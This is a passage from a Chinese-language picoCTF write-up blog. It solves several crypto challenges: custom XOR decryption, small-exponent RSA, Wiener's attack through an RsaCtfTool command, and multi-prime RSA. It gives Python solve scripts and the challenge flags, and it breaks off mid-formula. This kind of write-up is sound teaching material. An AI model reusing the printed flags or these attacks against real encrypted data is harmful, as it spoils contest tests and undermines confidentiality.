12），得到一個半密文（semi_cipher）。接下來這個半密文要先反轉，再用它寫好的 function 去做 XOR（因為它的 function 裡面又有一次反轉，所以這樣剛好會是和加密時相同的順序），最後得到的這個明文還要再反轉一次，才會得到正確的 flag。至於為甚麼要反轉兩次，解釋如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">假設題目的dynamic_xor_encrypt為f，明文為ABC</span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">f(ABC, KEY) = C&#x27;B&#x27;A&#x27;</span><br><span class="line"></span><br><span class="line">解密：</span><br><span class="line">第一次反轉，把C&#x27;B&#x27;A變為A&#x27;B&#x27;C，所以在f裡就會計算C&#x27;B&#x27;A對KEY的XOR</span><br><span class="line">f(A&#x27;B&#x27;C, KEY) = CBA</span><br><span class="line">第二次反轉，把CBA轉為ABC</span><br><span class="line">flag = ABC</span><br></pre></td></tr></table></figure><p>希望這樣解釋有比較清楚一點！總之照這樣解密就可以得到 flag 啦，以下是我的解密的代碼：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher: <span class="built_in">list</span>, key: <span class="built_in">int</span>, text_key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    semi_cipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> encrypted_value <span class="keyword">in</span> cipher:</span><br><span class="line">        decrypted_value = encrypted_value // (key * <span class="number">311</span>)  <span class="comment"># 使用 // 返回int</span></span><br><span class="line">        semi_cipher += <span class="built_in">chr</span>(decrypted_value)</span><br><span class="line">    semi_cipher = semi_cipher[::-<span class="number">1</span>]  <span class="comment"># 將密文反轉</span></span><br><span class="line">    plaintext = dynamic_xor_encrypt(semi_cipher, text_key)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">33588</span>,</span><br><span class="line">    <span class="number">276168</span>,</span><br><span class="line">    <span class="number">261240</span>,</span><br><span class="line">    <span class="number">302292</span>,</span><br><span class="line">    <span class="number">343344</span>,</span><br><span class="line">    <span class="number">328416</span>,</span><br><span class="line">    <span class="number">242580</span>,</span><br><span class="line">    <span class="number">85836</span>,</span><br><span class="line">    <span class="number">82104</span>,</span><br><span class="line">    <span class="number">156744</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">309756</span>,</span><br><span class="line">    <span class="number">78372</span>,</span><br><span class="line">    <span class="number">18660</span>,</span><br><span class="line">    <span class="number">253776</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">82104</span>,</span><br><span class="line">    <span class="number">320952</span>,</span><br><span class="line">    <span class="number">3732</span>,</span><br><span class="line">    <span class="number">231384</span>,</span><br><span class="line">    <span class="number">89568</span>,</span><br><span class="line">    <span class="number">100764</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">63444</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">97032</span>,</span><br><span class="line">    <span class="number">190332</span>,</span><br><span class="line">    <span class="number">119424</span>,</span><br><span class="line">    <span class="number">182868</span>,</span><br><span class="line">    <span class="number">97032</span>,</span><br><span class="line">    <span class="number">26124</span>,</span><br><span class="line">    <span class="number">44784</span>,</span><br><span class="line">    <span class="number">63444</span>,</span><br><span class="line">]</span><br><span class="line">plaintext = decrypt(cipher, <span class="number">12</span>, <span class="string">&quot;trudeau&quot;</span>)  <span class="comment"># since we know the key is 12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plaintext is: <span class="subst">&#123;plaintext[::-<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;custom_d2cr0pt6d_dc499538&#125;</span><br></pre></td></tr></table></figure><h2 id="Mini-RSA">Mini RSA</h2><p>題目給了一組 RSA 加密的密文，還有公鑰（n, e），如下。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106</span><br></pre></td></tr></table></figure><p>不難發現，這題的公鑰指數 e 超小，只有 3。所以我們使用小公鑰指數攻擊（Coppersmith’s attack, Low public exponent attack）。由於題目有說<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup></mrow><annotation encoding="application/x-tex">m^e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span></span></span>略大於<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，故其解題原理如下（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>為密文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>為明文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>是公鑰指數，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>是公鑰模數）：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c=m^e\mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>=</mo><mi>k</mi><mo>×</mo><mi>n</mi><mo>+</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">m^e=k\times n+c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Bruteforce k and find the eth root of </mtext><mi>k</mi><mo>×</mo><mi>n</mi><mo>+</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">\text{Bruteforce k and find the eth root of }k\times n+c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">Bruteforce k and find the eth root of </span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p><p>為了計算明文，我寫了一個 Python 腳本，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目所給的n, e, c</span></span><br><span class="line">n = <span class="number">1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力破解 k * n + c 的 e 次方根</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m, is_root = gmpy2.iroot(k * n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_root:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 數字轉字串</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><p>執行後就可以找到 flag 啦～</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702161343132.png" alt="Flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;e_sh0u1d_b3_lArg3r_7adb35b1&#125;</span><br></pre></td></tr></table></figure><h2 id="miniRSA">miniRSA</h2><p>這題的原理和上面那題一模一樣，都是 e 太小所以用小公鑰指數攻擊。想知道更詳細原理看<a href="http://localhost:4000/CTF/All-in-One%20PicoCTF-Writeups/#Mini-RSA">上面那題</a>，這邊直接上 Exploit。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目所給的n, e, c</span></span><br><span class="line">n = <span class="number">29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141</span></span><br><span class="line"><span class="comment"># 暴力破解 k * n + c 的 e 次方根</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m, is_root = gmpy2.iroot(k * n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_root:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 數字轉字串</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;n33d_a_lArg3r_e_d0cd6eae&#125;</span><br></pre></td></tr></table></figure><h2 id="b00tl3gRSA2">b00tl3gRSA2</h2><p>這題給了一個 Netcat 連接方式<code>nc jupiter.challenges.picoctf.org 57464</code>。先連進去主機看看吧。連進去後可以得到公鑰（e, n）跟密文 C。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600</span><br><span class="line">n: 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521</span><br><span class="line">e: 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973</span><br></pre></td></tr></table></figure><p>在題目的描述中他說：</p><blockquote><p>In RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e?</p></blockquote><p>意思是在這題裡面他把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span> 互換了，用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 來加密 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>。下面這篇文章有詳細說了為甚麼不應該使用這種做法。</p><ul><li><a href="https://crypto.stackexchange.com/questions/54557/rsa-does-it-matter-if-you-use-e-or-d-to-encrypt">RSA: Does it matter if you use e or d to encrypt?</a></li></ul><p>簡而言之，當私鑰指數（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>）比較小的時候，可以使用<a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener’s attack</a>。這邊可以使用一個開源工具來幫助我們快速執行攻擊。</p><ul><li><a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></li></ul><p>使用方式請查看官方文檔。總之 Exploit 如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RsaCtfTool.py -e 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973 -n 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521 --decrypt 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600 --attack wiener</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240707150749451.png" alt="Pwned!"></p><p>總之就是把參數都設定好，就可以成功得到 Flag 了。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;bad_1d3a5_2152720&#125;</span><br></pre></td></tr></table></figure><h2 id="b00tl3gRSA3">b00tl3gRSA3</h2><p>這題和上一題一樣，先用 Netcat 連線到主機，得到資訊如下。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775</span><br><span class="line">n: 3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759</span><br><span class="line">e: 65537</span><br></pre></td></tr></table></figure><p>題目說了</p><blockquote><p>Why use p and q when I can use more?</p></blockquote><p>意思是，這題的初始質數不只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。所以我們只要找到歐拉函數 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，並且正常走流程就可以了。由於他不只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 兩個質數，分解起來會容易很多。Exploit 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> factorint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phi</span>(<span class="params">n</span>):</span><br><span class="line">    f = factorint(n) <span class="comment"># 返回一個字典，key為質因數，value為該質因數的冪</span></span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> f.items():</span><br><span class="line">        phi *= <span class="built_in">pow</span>(a, b - <span class="number">1</span>) * (a - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目給的資訊</span></span><br><span class="line">c = <span class="number">1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775</span></span><br><span class="line">n = <span class="number">3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi = get_phi(n)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>這邊的<code>get_phi(n)</code>是用到了以下的求歐拉函數的公式：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><mrow><msub><mi>k</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo>×</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn><mo 